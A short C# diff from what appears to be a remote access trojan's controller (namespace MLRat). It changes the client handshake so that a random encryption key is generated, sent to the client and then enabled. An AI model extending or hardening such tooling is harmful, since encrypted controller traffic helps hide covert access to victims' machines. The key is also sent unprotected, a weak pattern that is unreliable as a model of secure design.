@@ -208,7 +208,9 @@ namespace MLRat.Forms
                                 string addUsername = (string) data[2];
                                 string OS = (string)data[3];
                                 _ClientData.Handshaken = true;
-                                client.Send(Guid.Empty, (byte)NetworkPacket.Connect);
+                                _ClientData.Encryption.GenerateRandomKey();
+                                client.Send(Guid.Empty, (byte)NetworkPacket.Connect, _ClientData.Encryption.Key);
+                                _ClientData.Encryption.Enabled = true;
                                 return;
                             }
                             return;
